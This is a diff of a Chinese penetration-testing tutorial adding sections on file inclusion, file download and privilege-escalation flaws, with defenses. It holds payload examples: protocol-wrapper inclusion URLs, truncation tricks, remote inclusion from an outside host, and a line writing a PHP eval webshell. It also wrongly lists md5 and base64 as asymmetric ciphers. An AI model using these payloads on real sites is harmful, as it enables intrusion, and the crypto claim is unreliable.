@@ -3,20 +3,26 @@
 
 @[toc]
 
-
 **作者：洪七**
 本文开始于2021/4/27
 预计2022年完成
+
+文章已经花了很多心思写，将来还会投入更多心思。如果对你有帮助，请帮忙点个star，这将给予我更多动力完成。
+
+
 # 写在前面
 **qq交流群：942443861**
 文章链接：https://github.com/ngadminq/Hong-Qigong-penetration-test-guide
 
+
+如果没有目录不方便你阅读，请把文章下载下来用typora打开，或者复制到CSDN编辑器。并及时关注文章的更新。后续我有时间会弄完目录的。
 
 ****
 *待补充：简要介绍每一章节讲了什么，应该如何阅读、学习*
 *待补充：每一种漏洞介绍经验，常见什么形式展现，从源码层面做分析*
 *将每种类型常见的公开漏洞做总结*
 *将文章拆分为：原理版和实践版*
+*github markdown 无法正确显示目录，后期有时间将此更正一下 *
 # 准备工作
 
 
@@ -306,6 +312,10 @@ msfvenom生成exe木马（不免杀）
 时间戳:网站源码通常不会直接显示比如2021/6/28而是会转换为时间戳的形式
 
 #### 分辨是什么类型的
+密码学的对称密码与非对称密码有哪些
+ -- 对称：DES、3DES、AES等
+ -- 非对称：md5、base64等
+
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628204319808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 如何分辨base64【主要应用在web中用于对源码的加密或者用户名或者密码的加密】
@@ -313,6 +323,8 @@ msfvenom生成exe木马（不免杀）
 很多都以等号结尾(为了凑齐所以结尾用等号)，当然也存在没有等号的base64
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628205659976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628210715235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+md5:任意长度的数据，算出的MD5值长度都是固定的，一般是32位也有16位。由数字大小写混成。密文中字母大小写不会影响破解结果
+
 **AES**
 AES最重要的是在base64基础上增加了两个参数即：密码和偏移；现在很多CTF也会有AES编码的题的，但都是给了这两个参数的值，不给的话神仙也解不出来
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628212205816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -324,27 +336,8 @@ HEX编码又叫十六进制编码，是数据的16进制表达形式，是计算
 
 密钥：如果加密密钥和解密密钥相同，那么这种密码算法叫做对称密码算法，这个比较好理解，符合正常的逻辑，一把钥匙对一把锁嘛；另外一类，正好相反，也就是加密密钥和解密密钥不相同，这种密码算法叫做非对称密码算法，也叫公钥密码算法，
 
-密码学的对称密码与非对称密码有哪些
- -- 对称：DES、3DES、AES等
- -- 非对称：md5、base64等
-
- ~md5是不是对称加密
- -- 不是
-
-，如何分辨MD5 //（特点）
-
- ~一般是固定长度32位（也有16位） // 16 位实际上是从 32 位字符串中，取中间的第 9 位到第 24 位的部分
-
- ~容易加密
-
- ~细微偏差得到最终的值差距很大
 
 
- 最后，md5经过计算得出128位2进制，正常的32位是二进制转换为16进制
- 在线网站一般是通过每日加密存储到数据库，与用户查询做对比
-3，栅栏密码
-
- 类似藏头诗，凯撒密码是栅栏密码的一种
 
 #### 解密
 
@@ -2871,11 +2864,94 @@ weblogic的反序列化
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210702164934707.png)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210702163522138.png)
 ## 文件操作
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071214141882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712164618229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+1.文件被解析，则是文件包含漏洞
+2.显示源代码，则是文件读取漏洞
+3.提示文件下载，则是文件下载漏洞
+
+### 文件包含
+将文件包含进去，调用指定文件的代码.这种漏洞也很好被确定，一般url包含形如file=1.txt的参数就可以疑似了。在进一步直接访问url/1.txt，如果返回的界面与带参数file=1.txt一样那么你就可以确认这是文件包含了 
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712150822393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
+文件包含的写法
+
+```bash
+<!--#include file="1.asp" -->
+<!--#include file="top.aspx" -->
+<c:import url="http://thief.one/1.jsp">
+<jsp:include page="head.jsp"/>
+<%@ include file="head.jsp"%>
+<?php Include('test.php')?>
+```
+
+#### 本地文件包含
+这类漏洞处理的两种方案，1进入你发现的敏感文件
+2 上传木马到文件，然后进行文件读取
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712162319492.png)
+
+**无限制包含**
+类似于如下，直接执行命令就可以进行文件的读取。
+http://127.0.0.1:8080/include.php?filename=1.txt
+http://127.0.0.1:8000/include.php?filename=../../../www.txt
+
+**有限制**
+这个限制可能是filename=1.txt网页后端强制添加后缀如加上'.html'
+
+加特殊符号如？或者%23
+%00截断：条件：magic_quotes_gpc=Off php版本<5.3.4（条件比较严格，不太推荐）
+
+```bash
+filename=../../../www.txt%00
+```
+
+溢出截断：条件：windows，点号需要长于256；linux长于4096 。
+因爲.对于文件尾巴命名而言是没什么意义的
+
+> windows:1.txt/././././././././././././././././././././././././././././././././././././././././././././
+> 或
+> 1.txt......................................................................................................................................................................................
+
+  
+
+     linux：1.txt............................................................................................................................
+
+#### 远程协议包含
+远程包含的危害要比本地文件包含的危害要大。
+当all_url_include是开启的，就可以执行远程.
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712153658277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+你所需要准备一个远程文件，可以是txt，只要里面包含有敏感代码,网站是什么语言，你就写什么语言的代码
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712154532580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+http://127.0.0.1:8080/iclude.php?filename=http://www.xiaodi8.com/readme.txt
+http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%20
+http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%23
+http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt? 
+#### 何种协议流玩法
+前面远程和本地都是通过漏洞扫描工具等测出来的，协议流方法才是真正手工测试的方案。
+https://www.cnblogs.com/endust/p/11804767.html
+http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt
+http://127.0.0.1:8080/include.php?filename=php://input POST:<?php system('ver')?>
+<?php fputs(fopen('s.php'，'w'),'<?php @eval($_POST[cmd])?>';?>
+http://127.0.0.1:8000/include.php?filename=file:///D:/phpstudy/PHPTutorial/www/1.txt
+http://127.0.0.1:8080/include.php?filename=data://text/plain,<?php%20phpinfo();?>
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712160934174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+#### 防御
+WAF
+固定后缀
+写固定比如后端只接受1.txt文件，其他一律不处理
+### 文件下载
+凡是网站有文件下载的功能都有可能发生漏洞。我们可以去分析下载链接和文件链接，已确定下载代码是在哪个目录。我们可以利用此漏洞下载敏感文件比如数据库配置等，也可以下载有价值的网站源码。值得注意的一点是我们下载的index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件，前者源码包含的文件更多，后者是解析后的文件。
+一般文件下载参数以post传递
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712170018155.png)
+
+**下载哪些文件**
+配置文件（数据库，平台，各种等）
+
+**公开漏洞**
+小米路由器
 ### 文件上传漏洞
-如果非常规类型，你判断出来就用相应方案，而不是一上来就用常规测试方法。对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。
+如果非常规类型，我们判断出来就用相应方案，而不是一上来就用常规测试方法。对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708210532166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。
@@ -3088,11 +3164,63 @@ a.pphphp -> a.
 
 
 
+## 逻辑越权
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712191714272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+### 越权
+用户登录的过程是先检测账户名和密码是不是对应得上，对应得上在根据用户的组给予相应权限。
+****
+水平越权：通过更换的某个ID之类的身份标识，从而使A账号获取(修改、删除等)B账号数据
+
+垂直越权：使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。
+
+未授权访问：通过删除请求中的认真信息后重放该请求，依旧可以访问或者完成操作。
+#### 水平越权
+原理：
+
+ - 前端安全造成：界面判断用户等级后，代码界面部分进行可选显示。
+ - 后盾安全造成：数据库
+
+**常见修改参数**
+如果有水平越权，常见修改数据包的参数有 uid、用户名
+
+**敏感操作**
+通常在于你在登录自己账号时，去通过修改参数登录了别人的账号.
+或你在登录你的主页后尝试切换别人的id
+**发现其他用户**
+用户名
+
+> 在注册时如果提示已存在用户 
+> 用户的评论等与网页的交互
+
+看id
+> 看用户传送到网页端的地址图像等可能含有他的ID
+>  看用户主页一般都有ID
+
+
+#### 垂直越权
+前提条件：获取的添加用户的数据包
+怎么来的数据包：
+1.普通用户前端有操作界面可以抓取数据包
+2.通过网站源码本地搭建自己去模拟抓取
+3.盲猜
+#### 待补充：工具
+寻找最好用的越权检测工具
+**在burpsuite装authz**
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712220713456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+#### 防御
+1.前后端同时对用户输入信息进行校验，双重验证机制
+2.调用功能前验证用户是否有权限调用相关功能
+3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限
+4.直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理
+5.永远不要相信来自用户的输入，对于可控参数进行严格的检测与过滤
+
 
 ## CRLF 注入
 
 **简介**
 难度：低
+
 通常用在：分享链接
 拓展思路：对客户端的攻击，比如投票、跳转、关注等；
 绕过安全防护软件；
@@ -6718,3 +6846,4 @@ Metasploit渗透测试魔鬼训练营 :
 ## 待补充：寻求交流社区
 
 Twitter/Reddit/StackOverflow
+
